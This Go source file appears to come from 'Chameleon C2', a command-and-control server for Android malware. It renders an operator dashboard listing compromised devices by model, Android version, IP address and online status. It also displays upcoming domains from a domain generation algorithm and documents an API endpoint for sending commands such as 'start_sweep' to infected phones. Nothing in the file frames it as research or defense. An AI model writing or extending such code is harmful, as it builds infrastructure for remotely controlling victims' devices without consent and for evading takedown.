package server

import (
	"fmt"
	"html/template"
	"log"
	"net/http"

	"github.com/your-org/chameleon-c2/internal/dga"
	"github.com/your-org/chameleon-c2/internal/types"
)

var dashboardTemplate = `
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Chameleon C2</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }
.container { max-width: 1200px; margin: 0 auto; }
h1 { font-size: 24px; margin-bottom: 20px; border-bottom: 1px solid #00ff41; padding-bottom: 10px; }
.stats { display: flex; gap: 20px; margin-bottom: 20px; }
.stat-box { background: #1a1a1a; border: 1px solid #00ff41; padding: 15px; flex: 1; }
.stat-box h3 { font-size: 12px; color: #00cc33; margin-bottom: 5px; }
.stat-box .value { font-size: 28px; }
table { width: 100%; border-collapse: collapse; margin-top: 10px; }
th, td { text-align: left; padding: 8px 12px; border-bottom: 1px solid #1a1a1a; font-size: 13px; }
th { color: #00cc33; font-size: 11px; text-transform: uppercase; }
tr:hover { background: #1a1a1a; }
.status-online { color: #00ff41; }
.status-offline { color: #666; }
.dga-info { margin-top: 20px; padding: 10px; background: #1a1a1a; font-size: 12px; color: #00cc33; }
a { color: #00ff41; text-decoration: none; }
a:hover { text-decoration: underline; }
.nav { margin-bottom: 20px; }
.nav a { margin-right: 15px; font-size: 14px; }
.empty { text-align: center; padding: 40px; color: #666; }
.refresh { margin-bottom: 10px; font-size: 12px; color: #666; }
</style>
</head>
<body>
<div class="container">
<h1>Chameleon C2 — Command & Control</h1>

<div class="nav">
<a href="/">Dashboard</a>
<a href="/api/devices">API: Devices</a>
<a href="/api/stats">API: Stats</a>
<a href="/api/health">API: Health</a>
</div>

<div class="stats">
<div class="stat-box"><h3>Total Devices</h3><div class="value">{{.TotalDevices}}</div></div>
<div class="stat-box"><h3>Connected Now</h3><div class="value">{{.ConnectedNow}}</div></div>
<div class="stat-box"><h3>Online</h3><div class="value">{{.Online}}</div></div>
<div class="stat-box"><h3>Offline</h3><div class="value">{{.Offline}}</div></div>
</div>

<div class="refresh">Last refreshed: {{.Time}} | DGA today: {{.DGAToday}}</div>

{{if .Devices}}
<table>
<thead>
<tr><th>Device ID</th><th>Name</th><th>Model</th><th>Android</th><th>IP</th><th>Status</th><th>Last Seen</th><th>Action</th></tr>
</thead>
<tbody>
{{range .Devices}}
<tr>
<td>{{.DeviceID}}</td>
<td>{{.DeviceName}}</td>
<td>{{.Manufacturer}} {{.Model}}</td>
<td>{{.AndroidVersion}} (API {{.APiLevel}})</td>
<td>{{.IPAddress}}</td>
<td class="status-{{.Status}}">{{.Status}}</td>
<td>{{.LastSeen.Format "Jan 02 15:04:05"}}</td>
<td><a href="/api/devices/{{.DeviceID}}">View</a></td>
</tr>
{{end}}
</tbody>
</table>
{{else}}
<div class="empty">No devices registered yet. Waiting for payload connections...</div>
{{end}}

<div class="dga-info">
DGA Domains (next 7 days):<br>
{{range .DGADomains}}&nbsp;&nbsp;{{.}}<br>{{end}}
</div>

<p style="margin-top: 20px; font-size: 12px; color: #666;">
Send commands via: <code>POST /api/command {"device_id":"...","command":"start_sweep","params":{"duration":300,"targets":["all"]}}</code>
</p>
</div>
<script>
setTimeout(function(){ location.reload(); }, 15000);
</script>
</body>
</html>
`

type dashboardData struct {
	TotalDevices  int
	ConnectedNow  int
	Online        int
	Offline       int
	Devices       []types.Device
	DGAToday      string
	DGADomains    []string
	Time          string
}

func (s *Server) handleDashboard(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}

	devices, err := s.db.ListDevices()
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}

	if devices == nil {
		devices = []types.Device{}
	}

	connected := s.hub.ConnectedDeviceIDs()
	connectedSet := make(map[string]bool)
	for _, id := range connected {
		connectedSet[id] = true
	}

	online := 0
	offline := 0
	for i := range devices {
		if connectedSet[devices[i].DeviceID] {
			devices[i].Status = "online"
			online++
		} else if devices[i].Status == "online" {
			online++
		} else {
			offline++
		}
	}

	tmpl, err := template.New("dashboard").Parse(dashboardTemplate)
	if err != nil {
		log.Printf("template parse error: %v", err)
		http.Error(w, "template error", 500)
		return
	}

	data := dashboardData{
		TotalDevices: len(devices),
		ConnectedNow: s.hub.ConnectedCount(),
		Online:       online,
		Offline:      offline,
		Devices:      devices,
		DGAToday:     dga.Today(),
		DGADomains:   dga.GenerateDomains(7),
		Time:         fmt.Sprintf("%s UTC", r.Context()),
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	tmpl.Execute(w, data)
}
